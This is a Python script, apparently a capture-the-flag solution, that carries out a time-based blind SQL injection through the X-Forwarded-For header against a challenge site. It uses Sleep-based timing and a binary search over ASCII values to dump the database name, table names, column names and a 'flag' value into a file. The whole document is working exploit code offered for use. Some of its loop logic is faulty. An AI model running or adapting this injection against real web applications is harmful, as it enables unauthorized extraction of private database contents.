import requests
import time
import datetime



url = "http://ctf5.shiyanbar.com/web/wonderkun/index.php"
add_parenthese = " (%s) "
get_SQL_result_length =" length(%s)>%d "
guess_ascii_sentence = " ascii(substring((%s) from %d for 1))>=%d  "
link_logic_word = " or "
end = " '1'='1 "

get_database = "select database()"

get_table_sum = "select count(*) from information_schema.tables where table_schema = '%s' "
get_table = "select table_name from information_schema.tables where table_schema = '%s' limit 1 offset %d"

get_column_sum = "select count(*) from information_schema.columns where table_schema = '%s' and table_name = '%s'"
get_column = "select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit 1 offset %d "

get_data_sum = " select count(*) from %s "
get_data = " select %s from %s limit 1 offset %d "
def GetUrlStatue(FinalSentence):
    Final = link_logic_word + FinalSentence + link_logic_word + " Sleep(2)" + link_logic_word + end
    headers = {'x-forwarded-for': "xx" + "'%s" % (Final)}
    print(headers)
    starttime = time.time()
    req = requests.get(url,headers=headers)
    endtime = time.time()
    subtime = endtime - starttime
    print(subtime)
    if  subtime < 2 :
        return True
    else:
        return False



def GetResultLength(result):
    for len in range(1,300):
        sentence = get_SQL_result_length%(result,len)
        if GetUrlStatue( sentence ) == False :
            break
    return len


#guess the value of the ascii for the SQL result#
def GetName(length,result,content):
    Name = ""
    for pos in range(1,length+1):
        Max = 127
        Min = 32
        Mid = ( Max + Min ) // 2
        while Min < Max-1 :
            sentence =  result%(content,pos,Mid)

            if GetUrlStatue( sentence ) == True :
                Min = Mid
            else:
                Max = Mid

            Mid = (Max + Min) // 2
        Name+=chr(Mid)
        print(Name)

    return Name

#database
database_length = GetResultLength(add_parenthese%get_database)
database_name = GetName(database_length,add_parenthese%guess_ascii_sentence,add_parenthese%get_database)

#table_sum is a character
table_sum = GetName(1,add_parenthese%guess_ascii_sentence,add_parenthese%(get_table_sum%database_name))

print(table_sum)

#table
all_tables = []
for n in range(int(table_sum)):
    get_table_sentence = get_table%(database_name,n)
    table_length = GetResultLength(add_parenthese%get_table_sentence)
    table_name = GetName(table_length,add_parenthese%guess_ascii_sentence,add_parenthese%get_table_sentence)
    all_tables.append(table_name)
print(all_tables)

#select table
while True:
    dump_table = input("which table do you want to dump ?")
    if dump_table in all_tables:
        break
    else:
        print("the table isn't exsist ")
table = dump_table

#same as table_sum
column_sum = GetName(1,add_parenthese%guess_ascii_sentence,add_parenthese%(get_column_sum%(database_name,table)))


all_column = []
for n in range(int(column_sum)):
    get_column_sentence = get_column%(database_name,table,n)
    column_length = GetResultLength(add_parenthese%get_column_sentence)
    column_name = GetName(column_length,add_parenthese%guess_ascii_sentence,add_parenthese%get_column_sentence)
    all_column.append(column_name)
print(all_column)




data_sum = GetName(1,add_parenthese%guess_ascii_sentence,add_parenthese%get_data_sum%table)
print(data_sum)

for column in all_column:
    for n in range(int(data_sum)):
        all_data = []
        get_data_sentence =get_data%("flag", table, 0)
        data_length = GetResultLength(add_parenthese%get_data_sentence)
        data_name = GetName(data_length,add_parenthese%guess_ascii_sentence,add_parenthese%get_data_sentence)
        all_data.append(data_name)
        print(all_data)

for str in all_data:
    now = datetime.datetime.now()
    time = now.strftime('%Y-%m-%d %H:%M:%S')
    file = open("flag.txt","w+")
    file.write("%s   %s\n"%(str,time))
    file.close()



print()